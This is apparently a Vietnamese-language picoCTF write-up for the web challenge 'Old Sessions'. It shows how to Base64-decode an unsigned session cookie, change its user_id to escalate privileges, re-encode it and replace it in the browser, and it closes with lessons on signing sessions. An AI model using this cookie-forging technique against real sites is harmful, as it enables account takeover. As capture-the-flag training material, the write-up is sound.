# 🧩 Challenge: Old Sessions

## 🏷 Platform

picoCTF

## 📂 Category

🌐 Web Exploitation

---

## 📌 Description

Bài yêu cầu tìm flag từ một website có cơ chế session đăng nhập.

---

## 🔍 Analysis

* Khi truy cập website, server gán cho ta một **cookie session**
* Cookie có dạng:

```
session=...
```

* Thử decode giá trị session → nhận thấy nó là **Base64**

👉 Decode ra thấy dạng:

```
{"user_id": "1"}
```

* Điều này cho thấy:

  * Session đang lưu thông tin user
  * Có thể chỉnh sửa để leo quyền

---

## ⚙️ Exploitation

### Bước 1: Decode cookie

Dùng base64 decode:

```
echo "session_value" | base64 -d
```

---

### Bước 2: Sửa giá trị

Thử đổi:

```
{"user_id": "1"} → {"user_id": "2"}
```

👉 Hoặc các giá trị khác (admin thường là id lớn hơn)

---

### Bước 3: Encode lại

```
echo '{"user_id":"2"}' | base64
```

---

### Bước 4: Gửi lại cookie

* Mở DevTools → Application → Cookies
* Thay giá trị session mới
* Refresh lại trang

---

## 🏁 Flag

```
picoCTF{example_flag}
```

---

## 📚 Lessons Learned

* Không nên tin dữ liệu phía client (cookie)
* Session phải được:

  * Ký (signed)
  * Hoặc mã hóa an toàn
* Base64 **không phải mã hóa**, chỉ là encoding

---

## 🔗 Kiến thức liên quan

* Authentication bypass
* Session management
* OWASP A02: Broken Authentication

---

## 🛠 Tools Used

* Browser DevTools
* Base64 encode/decode

---

## 🚀 Ghi chú

Đây là bài giúp hiểu rõ:
👉 Session có thể bị chỉnh sửa nếu không được bảo vệ đúng cách
👉 Một lỗi rất phổ biến trong web thực tế
